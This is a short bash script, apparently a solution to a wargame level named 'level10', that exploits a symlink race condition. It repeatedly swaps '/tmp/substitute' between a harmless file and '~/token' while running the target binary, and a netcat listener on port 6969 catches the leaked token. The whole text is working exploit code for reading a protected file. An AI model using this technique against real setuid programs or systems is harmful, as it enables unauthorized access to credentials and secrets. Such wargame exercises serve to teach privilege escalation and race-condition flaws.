#! /bin/bash
end=$((SECONDS+2))

echo '.*( )' > /tmp/swap

(while [ $SECONDS -lt $end ]; do 
	(nc -l 6969 | tr -d '.*( )*.\n')&
	(~/level10 /tmp/substitute 127.0.0.1 &> /dev/null)&
	(ln -fs /tmp/swap /tmp/substitute;
	ln -fs ~/token /tmp/substitute;)
done;)
kill `pidof nc`

